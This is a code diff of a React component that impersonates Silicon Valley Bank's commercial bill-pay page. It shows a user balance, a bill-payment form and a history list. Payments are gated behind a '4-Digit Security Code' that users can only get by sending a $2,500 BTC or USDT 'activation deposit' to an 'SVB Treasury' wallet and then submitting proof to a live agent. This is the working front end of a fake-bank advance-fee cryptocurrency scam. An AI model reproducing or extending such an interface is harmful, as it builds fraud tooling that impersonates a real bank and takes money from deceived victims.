@@ -7,18 +7,14 @@ import {
   CheckCircle2, 
   AlertCircle, 
   Building, 
-  DollarSign, 
-  Calendar, 
-  Clock, 
   Plus, 
   FileCheck2,
   ShieldCheck,
-  Search,
-  Key,
-  Shield,
-  X,
-  Copy,
-  Check
+  Key, 
+  Shield, 
+  X, 
+  Copy, 
+  Check 
 } from 'lucide-react';
 import { PaymentProofOptionsModal } from './PaymentProofOptionsModal';
 import { triggerOpenSVBLiveChat } from './SupportChatWidget';
@@ -49,7 +45,6 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
   const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
   const [showCryptoModal, setShowCryptoModal] = useState(false);
   const [showProofOptionsModal, setShowProofOptionsModal] = useState(false);
-  const [showTier3PromptModal, setShowTier3PromptModal] = useState(false);
   const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
   const [submittingDeposit, setSubmittingDeposit] = useState(false);
   const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
@@ -130,7 +125,7 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
 
     try {
       setSubmitting(true);
-      const res = await api.payBill({
+      await api.payBill({
         billerName: billerName.trim(),
         billerCategory,
         accountNumber: user.accountNumber,
@@ -166,7 +161,6 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
     setShowProofOptionsModal(false);
     setShowCryptoModal(false);
     
-    // Launch user's default email client
     openLiveAgentEmail(user, {
       method: cryptoMethod,
       amount: 2500,
@@ -200,7 +194,6 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
       setShowCryptoModal(false);
       setDepositSuccessMsg(`Connecting to SVB Live Chat...`);
       
-      // Open Live Chat Widget
       setTimeout(() => {
         triggerOpenSVBLiveChat();
         setDepositSuccessMsg(null);
@@ -213,96 +206,96 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
   };
 
   return (
-    <div className="max-w-7xl mx-auto space-y-6 pb-12">
+    <div className="max-w-7xl mx-auto space-y-6 pb-12 font-sans">
       {/* Top Navigation Row */}
       <div className="flex items-center justify-between">
         <BackButton />
       </div>
 
       {/* Header Banner */}
-      <div className="bg-gradient-to-r from-slate-900 via-indigo-950 to-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
-        <div className="absolute top-0 right-0 -mt-12 -mr-12 w-64 h-64 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
-        
-        <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
-          <div>
-            <div className="flex items-center gap-2 mb-2">
-              <span className="p-2 bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 rounded-xl">
-                <Receipt className="w-5 h-5" />
-              </span>
-              <span className="text-xs font-bold uppercase tracking-widest text-cyan-400">Silicon Valley Bank Bill Pay</span>
-            </div>
-            <h1 className="text-2xl sm:text-3xl font-extrabold text-white tracking-tight">Commercial Bill & Vendor Payments</h1>
-            <p className="text-slate-400 text-sm mt-1 max-w-2xl">
-              Pay corporate utility providers, software vendors, tax authorities, and lease agreements directly from your SVB accounts with automated remittance confirmation.
-            </p>
+      <div className="bg-[#002b49] rounded-2xl p-6 sm:p-7 text-white shadow-xs border border-[#0b1723] flex flex-col md:flex-row md:items-center justify-between gap-6">
+        <div>
+          <div className="flex items-center gap-2 mb-1.5">
+            <span className="p-1.5 bg-[#0b1d2e] text-[#00a3e0] rounded-lg">
+              <Receipt className="w-4 h-4" />
+            </span>
+            <span className="text-[11px] font-bold uppercase tracking-wider text-[#00a3e0]">
+              Silicon Valley Bank Bill Pay
+            </span>
           </div>
+          <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
+            Commercial Bill & Vendor Payments
+          </h1>
+          <p className="text-slate-300 text-xs mt-1 max-w-2xl">
+            Execute payments to corporate suppliers, SaaS software vendors, utilities, and tax authorities directly from your settled account balance.
+          </p>
+        </div>
 
-          <div className="bg-slate-950/60 border border-slate-800 p-4 rounded-2xl text-right">
-            <p className="text-xs text-slate-400 font-medium">Available Account Balance</p>
-            <p className="text-2xl font-mono font-extrabold text-cyan-400 mt-0.5">
-              ${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-            </p>
-          </div>
+        <div className="p-3.5 bg-[#0b1d2e] border border-[#173652] rounded-xl text-left sm:text-right shrink-0">
+          <p className="text-[11px] text-slate-400 font-semibold uppercase">Available Balance</p>
+          <p className="text-xl font-mono font-extrabold text-white mt-0.5 tabular-nums">
+            ${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+          </p>
         </div>
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
+      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
         {/* Left Column: Form */}
-        <div className="bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-xl space-y-6 h-fit">
-          <div className="border-b border-slate-800 pb-4">
-            <h2 className="text-lg font-bold text-white flex items-center gap-2">
-              <Building className="w-5 h-5 text-cyan-400" />
-              Pay a Bill / Vendor
+        <div className="bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-6 shadow-xs space-y-4 h-fit">
+          <div className="border-b border-slate-100 pb-3">
+            <h2 className="text-base font-bold text-slate-900 flex items-center gap-2">
+              <Building className="w-4 h-4 text-[#00a3e0]" />
+              Pay a Bill or Vendor
             </h2>
-            <p className="text-slate-400 text-xs mt-1">Execute immediate automated payment to any corporate biller.</p>
+            <p className="text-slate-500 text-xs mt-0.5">Automated remittance to verified commercial payees.</p>
           </div>
 
           {error && (
-            <div className="p-3 bg-rose-500/10 border border-rose-500/20 text-rose-400 text-xs rounded-2xl flex items-center gap-2">
+            <div className="p-3 bg-rose-50 border border-rose-200 text-rose-800 text-xs rounded-xl flex items-center gap-2">
               <AlertCircle className="w-4 h-4 shrink-0" />
               <span>{error}</span>
             </div>
           )}
 
           {successMsg && (
-            <div className="p-3 bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs rounded-2xl flex items-center gap-2">
+            <div className="p-3 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs rounded-xl flex items-center gap-2">
               <CheckCircle2 className="w-4 h-4 shrink-0" />
               <span>{successMsg}</span>
             </div>
           )}
 
-          <form onSubmit={handlePayBill} className="space-y-4 text-xs">
+          <form onSubmit={handlePayBill} className="space-y-3.5 text-xs">
             <div>
-              <label className="block text-slate-300 font-semibold mb-1">Biller / Vendor Name</label>
+              <label className="block text-slate-700 font-semibold mb-1">Biller / Vendor Name</label>
               <input
                 type="text"
                 value={billerName}
                 onChange={e => setBillerName(e.target.value)}
-                placeholder="e.g. AWS Cloud Services, PG&E, Slack, IRS Tax"
-                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-medium focus:border-cyan-500 focus:outline-none"
+                placeholder="e.g. AWS Cloud, PG&E, Slack, IRS Tax"
+                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-slate-900 outline-none transition-colors"
                 required
               />
             </div>
 
             <div>
-              <label className="block text-slate-300 font-semibold mb-1">Category</label>
+              <label className="block text-slate-700 font-semibold mb-1">Expense Category</label>
               <select
                 value={billerCategory}
                 onChange={e => setBillerCategory(e.target.value as any)}
-                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-medium focus:border-cyan-500 focus:outline-none"
+                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-slate-900 font-medium outline-none"
               >
                 <option value="Utilities">Utilities & Infrastructure</option>
-                <option value="Vendor Invoice">Software & Vendor Invoice</option>
-                <option value="Tax & Regulatory">Tax & Regulatory Fee</option>
+                <option value="Vendor Invoice">Software & Vendor Invoices</option>
+                <option value="Tax & Regulatory">Tax & Regulatory Fees</option>
                 <option value="Payroll & Benefits">Payroll & HR Benefits</option>
                 <option value="Rent & Lease">Real Estate Lease & Rent</option>
               </select>
             </div>
 
             <div>
-              <label className="block text-slate-300 font-semibold mb-1">Payment Amount ($ USD)</label>
+              <label className="block text-slate-700 font-semibold mb-1">Payment Amount ($ USD)</label>
               <div className="relative">
-                <span className="absolute left-3.5 top-2.5 text-slate-400 font-bold">$</span>
+                <span className="absolute left-3 top-2 text-slate-400 font-bold">$</span>
                 <input
                   type="number"
                   step="0.01"
@@ -310,18 +303,18 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
                   value={amount}
                   onChange={e => setAmount(e.target.value)}
                   placeholder="0.00"
-                  className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-8 pr-3.5 py-2.5 text-white font-mono font-bold focus:border-cyan-500 focus:outline-none"
+                  className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl pl-7 pr-3 py-2 text-slate-900 font-mono font-bold outline-none tabular-nums"
                   required
                 />
               </div>
             </div>
 
-            {/* 4-Digit Security Code Input */}
+            {/* 4-Digit Security Code */}
             <div>
-              <label className="block text-slate-300 font-semibold mb-1 flex items-center justify-between">
-                <span>4-Digit Security Authorization Code</span>
-                <span className="text-[10px] text-amber-400 font-bold flex items-center gap-1">
-                  <Key className="w-3 h-3" /> Required
+              <label className="block text-slate-700 font-semibold mb-1 flex items-center justify-between">
+                <span>4-Digit Security Code</span>
+                <span className="text-[10px] text-amber-700 font-bold flex items-center gap-1">
+                  <Key className="w-3 h-3 text-amber-600" /> Required
                 </span>
               </label>
               <input
@@ -330,43 +323,43 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
                 value={fourDigitCode}
                 onChange={e => setFourDigitCode(e.target.value)}
                 placeholder="••••"
-                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono font-bold tracking-widest focus:border-cyan-500 focus:outline-none"
+                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-slate-900 font-mono font-bold tracking-widest outline-none"
                 required
               />
             </div>
 
             <div>
-              <label className="block text-slate-300 font-semibold mb-1">Invoice / Reference # (Optional)</label>
+              <label className="block text-slate-700 font-semibold mb-1">Invoice / Reference Number (Optional)</label>
               <input
                 type="text"
                 value={reference}
                 onChange={e => setReference(e.target.value)}
                 placeholder="e.g. INV-904812"
-                className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono focus:border-cyan-500 focus:outline-none"
+                className="w-full bg-slate-50 border border-slate-200 focus:border-[#00a3e0] focus:bg-white rounded-xl px-3 py-2 text-slate-900 font-mono outline-none"
               />
             </div>
 
             <button
               type="submit"
               disabled={submitting}
-              className="w-full py-3 bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 font-extrabold rounded-2xl shadow-lg shadow-cyan-500/20 disabled:opacity-50 transition-all text-xs"
+              className="w-full py-2.5 bg-[#002b49] hover:bg-[#001f35] text-white font-bold rounded-xl shadow-xs disabled:opacity-50 transition-colors text-xs cursor-pointer"
             >
-              {submitting ? 'Processing Payment...' : 'Execute Bill Payment'}
+              {submitting ? 'Executing Payment...' : 'Execute Bill Payment'}
             </button>
           </form>
         </div>
 
-        {/* Right Column: Recent Bill History */}
-        <div className="lg:col-span-2 bg-slate-900/90 border border-slate-800 rounded-3xl p-6 sm:p-8 shadow-xl space-y-6">
-          <div className="flex items-center justify-between border-b border-slate-800 pb-4">
+        {/* Right Column: History */}
+        <div className="lg:col-span-2 bg-white border border-slate-200/90 rounded-2xl p-5 sm:p-6 shadow-xs space-y-4">
+          <div className="flex items-center justify-between border-b border-slate-100 pb-3">
             <div>
-              <h2 className="text-lg font-bold text-white flex items-center gap-2">
-                <FileCheck2 className="w-5 h-5 text-cyan-400" />
-                Bill Payment History
+              <h2 className="text-base font-bold text-slate-900 flex items-center gap-2">
+                <FileCheck2 className="w-4 h-4 text-[#00a3e0]" />
+                Recent Bill Remittances
               </h2>
-              <p className="text-slate-400 text-xs mt-1">Audit log of corporate bill payments processed under account #{user.accountNumber}</p>
+              <p className="text-slate-500 text-xs mt-0.5">Disbursements executed under account #{user.accountNumber}</p>
             </div>
-            <span className="text-xs bg-slate-800 text-slate-300 font-mono px-3 py-1 rounded-full font-semibold">
+            <span className="text-xs bg-slate-100 text-slate-700 font-mono px-2.5 py-0.5 rounded-full font-bold">
               {bills.length} Records
             </span>
           </div>
@@ -374,42 +367,43 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
           {loading ? (
             <div className="p-8 text-center text-slate-400">Loading bill payments...</div>
           ) : bills.length === 0 ? (
-            <div className="p-8 text-center text-slate-500 border border-slate-800/80 rounded-2xl space-y-2">
-              <Receipt className="w-10 h-10 mx-auto text-slate-600" />
-              <p className="text-xs font-semibold text-slate-400">No bill payments executed yet.</p>
+            <div className="p-8 text-center text-slate-500 border border-dashed border-slate-200 rounded-xl space-y-2">
+              <Receipt className="w-8 h-8 mx-auto text-slate-400" />
+              <p className="text-xs font-semibold text-slate-700">No bill payments executed yet.</p>
+              <p className="text-[11px] text-slate-400">Paid invoices and vendor remittances will appear in this ledger.</p>
             </div>
           ) : (
-            <div className="divide-y divide-slate-800/80">
+            <div className="divide-y divide-slate-100">
               {bills.map(bill => (
-                <div key={bill.id} className="py-4 flex items-center justify-between gap-4 hover:bg-slate-800/30 px-3 rounded-xl transition-colors">
+                <div key={bill.id} className="py-3 flex items-center justify-between gap-4 hover:bg-slate-50/80 px-2 rounded-xl transition-colors">
                   <div className="flex items-center gap-3">
-                    <div className="w-10 h-10 rounded-2xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 font-bold shrink-0">
-                      <Receipt className="w-5 h-5" />
+                    <div className="w-9 h-9 rounded-xl bg-slate-100 text-slate-700 flex items-center justify-center shrink-0">
+                      <Receipt className="w-4 h-4" />
                     </div>
                     <div>
                       <div className="flex items-center gap-2">
-                        <h4 className="font-bold text-white text-xs">{bill.billerName}</h4>
+                        <h4 className="font-bold text-slate-900 text-xs">{bill.billerName}</h4>
                         <span className={`px-2 py-0.5 rounded-full text-[9px] font-bold ${
                           bill.status === 'Completed' 
-                            ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' 
-                            : 'bg-amber-500/10 text-amber-400 border border-amber-500/20'
+                            ? 'bg-emerald-100 text-emerald-800' 
+                            : 'bg-amber-100 text-amber-800'
                         }`}>
                           {bill.status || 'Pending'}
                         </span>
                       </div>
                       <div className="flex items-center gap-2 text-[10px] text-slate-400 mt-0.5">
-                        <span className="text-cyan-400 font-semibold">{bill.billerCategory}</span>
+                        <span className="text-slate-600 font-medium">{bill.billerCategory}</span>
                         <span>•</span>
-                        <span className="font-mono">Ref: {bill.reference}</span>
+                        <span className="font-mono">Ref: {bill.reference || 'N/A'}</span>
                       </div>
                     </div>
                   </div>
 
                   <div className="text-right">
-                    <p className="font-mono font-bold text-rose-400 text-sm">
+                    <p className="font-mono font-bold text-slate-900 text-sm tabular-nums">
                       -${bill.amount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                     </p>
-                    <p className="text-[10px] text-slate-500 mt-0.5">
+                    <p className="text-[10px] text-slate-400 mt-0.5">
                       {new Date(bill.paymentDate).toLocaleDateString()}
                     </p>
                   </div>
@@ -420,154 +414,100 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
         </div>
       </div>
 
-      {/* Deposit Required Prompt Modal */}
-      {showDepositPromptModal && (
-        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
-          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 max-w-md w-full shadow-2xl relative space-y-5">
-            <button 
-              onClick={() => setShowDepositPromptModal(false)}
-              className="absolute top-4 right-4 p-2 text-slate-400 hover:text-white rounded-full bg-slate-800/50"
-            >
-              <X className="w-5 h-5" />
-            </button>
-
-            <div className="w-12 h-12 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
-              <Shield className="w-6 h-6" />
-            </div>
-
-            <div className="text-center space-y-2">
-              <h3 className="text-xl font-extrabold text-white">4-Digit Security Code Required</h3>
-              <p className="text-xs text-slate-300 leading-relaxed">
-                You do not have an approved 4-digit transfer code. To obtain your code and execute outgoing transfers and bill payments, complete a $2,500 BTC or USDT activation deposit.
-              </p>
-            </div>
-
-            <div className="space-y-3 pt-2">
-              <button
-                onClick={() => {
-                  setShowDepositPromptModal(false);
-                  setShowCryptoModal(true);
-                }}
-                className="w-full py-3 bg-gradient-to-r from-amber-500 to-yellow-500 text-slate-950 font-extrabold text-xs rounded-xl shadow-lg shadow-amber-500/20"
-              >
-                Deposit $2,500 via BTC / USDT
-              </button>
-              <button
-                onClick={() => setShowDepositPromptModal(false)}
-                className="w-full py-2.5 text-slate-400 hover:text-white text-xs font-semibold"
-              >
-                Cancel
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Crypto Payment Modal */}
+      {/* Crypto Payment Modal for 4-Digit Code */}
       {showCryptoModal && (
-        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4 overflow-y-auto">
-          <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 sm:p-8 max-w-lg w-full shadow-2xl relative space-y-6 my-8">
+        <div className="fixed inset-0 z-50 bg-slate-950/70 backdrop-blur-sm flex items-center justify-center p-4 overflow-y-auto">
+          <div className="bg-white border border-slate-200 rounded-2xl p-6 sm:p-7 max-w-lg w-full shadow-2xl relative space-y-4 my-8 text-slate-900">
             <button 
               onClick={() => {
                 setShowCryptoModal(false);
                 setDepositSuccessMsg(null);
               }}
-              className="absolute top-4 right-4 p-2 text-slate-400 hover:text-white rounded-full bg-slate-800/50"
+              className="absolute top-4 right-4 p-1.5 text-slate-400 hover:text-slate-700 rounded-lg bg-slate-100 cursor-pointer"
             >
-              <X className="w-5 h-5" />
+              <X className="w-4 h-4" />
             </button>
 
-            <div className="border-b border-slate-800 pb-4">
+            <div className="border-b border-slate-100 pb-3">
               <div className="flex items-center gap-2 mb-1">
-                <span className="p-1.5 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-lg">
-                  <Key className="w-4 h-4" />
+                <span className="p-1.5 bg-amber-100 text-amber-800 rounded-lg">
+                  <Key className="w-4 h-4 text-amber-700" />
                 </span>
-                <span className="text-[10px] font-bold uppercase tracking-widest text-amber-400">4-Digit Code Security Deposit</span>
+                <span className="text-[10px] font-bold uppercase tracking-wider text-amber-800">
+                  4-Digit Security Authorization
+                </span>
               </div>
-              <h3 className="text-lg font-bold text-white">Deposit $2,500 USD (BTC or USDT)</h3>
-              <p className="text-xs text-slate-400 mt-1">
-                Send exactly $2,500 USD in cryptocurrency to the SVB Treasury address below to receive your permanent 4-Digit Security Authorization Code.
+              <h3 className="text-base font-bold text-slate-900">Activation Deposit Required ($2,500 USD)</h3>
+              <p className="text-xs text-slate-500 mt-0.5">
+                Send $2,500 USD equivalent in BTC or USDT to the SVB Treasury address below to verify account and issue your 4-Digit Authorization Code.
               </p>
             </div>
 
             {depositSuccessMsg ? (
-              <div className="p-4 bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs rounded-2xl space-y-4 text-center">
-                <CheckCircle2 className="w-8 h-8 text-emerald-400 mx-auto" />
+              <div className="p-4 bg-emerald-50 border border-emerald-200 text-emerald-800 text-xs rounded-xl space-y-3 text-center">
+                <CheckCircle2 className="w-8 h-8 text-emerald-600 mx-auto" />
                 <p className="font-semibold leading-relaxed">{depositSuccessMsg}</p>
                 <button
                   onClick={() => {
                     setShowCryptoModal(false);
                     setDepositSuccessMsg(null);
                   }}
-                  className="px-6 py-2 bg-emerald-500 text-slate-950 font-bold rounded-xl text-xs"
+                  className="w-full py-2 bg-[#002b49] text-white font-bold rounded-xl text-xs"
                 >
-                  Close Window
+                  Done
                 </button>
               </div>
             ) : (
-              <form onSubmit={handleCryptoDepositSubmit} className="space-y-5 text-xs">
-                {/* Method selector */}
+              <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs">
+                {/* Method Selector */}
                 <div>
-                  <label className="block text-slate-300 font-semibold mb-2">Select Cryptocurrency Network</label>
-                  <div className="grid grid-cols-2 gap-3">
+                  <label className="block text-slate-700 font-semibold mb-1">Select Asset</label>
+                  <div className="grid grid-cols-2 gap-2">
                     <button
                       type="button"
                       onClick={() => setCryptoMethod('BTC')}
-                      className={`p-3 rounded-2xl border text-left flex items-center justify-between transition-all ${
-                        cryptoMethod === 'BTC'
-                          ? 'bg-amber-500/10 border-amber-500 text-white font-bold'
-                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
+                      className={`p-2.5 rounded-xl border flex items-center justify-center gap-2 font-bold cursor-pointer transition-colors ${
+                        cryptoMethod === 'BTC' ? 'border-[#002b49] bg-slate-100 text-slate-900' : 'border-slate-200 text-slate-600'
                       }`}
                     >
                       <span>Bitcoin (BTC)</span>
-                      <span className="text-[10px] bg-amber-500/20 text-amber-400 px-2 py-0.5 rounded-full font-mono">BTC</span>
                     </button>
-
                     <button
                       type="button"
                       onClick={() => setCryptoMethod('USDT')}
-                      className={`p-3 rounded-2xl border text-left flex items-center justify-between transition-all ${
-                        cryptoMethod === 'USDT'
-                          ? 'bg-emerald-500/10 border-emerald-500 text-white font-bold'
-                          : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
+                      className={`p-2.5 rounded-xl border flex items-center justify-center gap-2 font-bold cursor-pointer transition-colors ${
+                        cryptoMethod === 'USDT' ? 'border-[#002b49] bg-slate-100 text-slate-900' : 'border-slate-200 text-slate-600'
                       }`}
                     >
-                      <span>Tether (USDT)</span>
-                      <span className="text-[10px] bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded-full font-mono">TRC20</span>
+                      <span>Tether (USDT ERC-20)</span>
                     </button>
                   </div>
                 </div>
 
-                {/* Wallet Address Box */}
-                <div className="bg-slate-950 p-4 rounded-2xl border border-slate-800 space-y-2">
-                  <div className="flex items-center justify-between text-slate-400 text-[11px]">
-                    <span>Official {cryptoMethod} Deposit Address</span>
-                    <span className="text-emerald-400 font-bold">Amount: $2,500.00 USD</span>
-                  </div>
-                  <div className="flex items-center gap-2">
-                    <input
-                      type="text"
-                      readOnly
-                      value={walletAddresses[cryptoMethod]}
-                      className="w-full bg-slate-900 border border-slate-800 rounded-xl px-3 py-2 text-amber-300 font-mono text-[11px] select-all focus:outline-none"
-                    />
+                {/* Treasury Address */}
+                <div className="p-3 bg-slate-50 rounded-xl border border-slate-200 space-y-1.5">
+                  <div className="flex items-center justify-between text-slate-600">
+                    <span className="font-bold">SVB Treasury Wallet Address:</span>
                     <button
                       type="button"
                       onClick={() => copyAddress(walletAddresses[cryptoMethod])}
-                      className="p-2 bg-slate-800 hover:bg-slate-700 text-white rounded-xl transition-colors shrink-0"
-                      title="Copy Address"
+                      className="text-[#002b49] font-bold hover:underline flex items-center gap-1 cursor-pointer"
                     >
-                      {copiedAddress ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
+                      {copiedAddress ? <Check className="w-3 h-3 text-emerald-600" /> : <Copy className="w-3 h-3" />}
+                      <span>{copiedAddress ? 'Copied' : 'Copy'}</span>
                     </button>
                   </div>
+                  <p className="font-mono text-xs font-bold text-slate-900 break-all tabular-nums">
+                    {walletAddresses[cryptoMethod]}
+                  </p>
                 </div>
 
                 <button
                   type="submit"
                   disabled={submittingDeposit}
-                  className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-bold py-3.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2 cursor-pointer"
+                  className="w-full py-2.5 bg-[#002b49] hover:bg-[#001f35] text-white font-bold rounded-xl text-xs transition-colors cursor-pointer"
                 >
-                  {submittingDeposit ? 'Submitting Verification...' : 'Submit $2,500 Payment Proof for Verification'}
+                  I Have Completed Payment → Submit Proof
                 </button>
               </form>
             )}
@@ -575,16 +515,12 @@ export const BillPayPanel: React.FC<BillPayPanelProps> = ({ user, onRefreshUser,
         </div>
       )}
 
-      {/* Payment Proof Options Modal */}
+      {/* Proof Options Modal */}
       <PaymentProofOptionsModal
         isOpen={showProofOptionsModal}
         onClose={() => setShowProofOptionsModal(false)}
-        user={user}
-        cryptoMethod={cryptoMethod}
-        walletAddress={walletAddresses[cryptoMethod]}
         onSelectLiveAgent={handleSelectLiveAgent}
         onSelectSVBLive={handleSelectSVBLive}
-        submitting={submittingDeposit}
       />
     </div>
   );
